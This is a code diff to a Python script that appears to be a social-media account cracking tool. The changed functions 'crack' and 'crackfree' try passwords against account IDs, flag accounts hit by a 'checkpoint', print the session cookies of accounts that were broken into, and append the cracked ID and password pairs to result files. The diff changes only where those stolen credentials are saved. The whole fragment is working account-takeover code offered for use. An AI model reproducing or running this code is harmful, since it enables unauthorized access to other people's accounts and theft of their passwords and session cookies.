@@ -666,7 +666,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
             #   print(f#\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                 #os.system#('espeak -a 300 " Cp,"')
-                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
+                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' | '+pw)
                 cp+=1
                 break
@@ -676,7 +676,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m[MANAS-Ok] {idf} | {pw}\n\033[0;93m[❤️]= COOKIES • \033[0;92m{kuki} ')
                #$ os.system(#espeak -a 300 " MANAS,  Ok,  id"')
-                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
+                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
             else:
@@ -708,7 +708,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                # os.system#('espeak -a 300 " Cp,"')
-                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
+                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -718,7 +718,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                 #os.system#('espeak -a 300 " Ok,  MANAS,  id"')
-                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
+                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
             else:
